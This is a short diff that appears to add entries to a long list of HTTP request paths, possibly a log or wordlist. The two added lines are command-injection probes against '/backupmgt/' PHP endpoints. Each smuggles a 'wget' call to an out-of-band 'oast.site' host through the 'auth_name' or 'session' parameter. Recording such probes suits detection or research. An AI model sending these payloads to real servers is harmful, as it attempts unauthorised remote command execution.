@@ -30920,3 +30920,5 @@ http://64.233.170.113/
 /runtime/cache/123.txt
 /?gad_source=5&gad_campaignid=21979123179&gclid=EAIaIQobChMIv5PXx7SVjgMVWVqEBh1ugz3CEAEYASAAEgKBdPD_BwE
 /?srsltid=AfmBOoqJrTKRMYRDZYyG8vJBIUNxAP02oDJvmqWjaUzV97NwCRUydhjv
+/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://d1g6fujpu1sm2rahe0kg8fmzuz3wc9jbj.oast.site;
+/backupmgt/localJob.php?session=fail;wget+http://d1g6fujpu1sm2rahe0kg3hydtwrprzab3.oast.site;
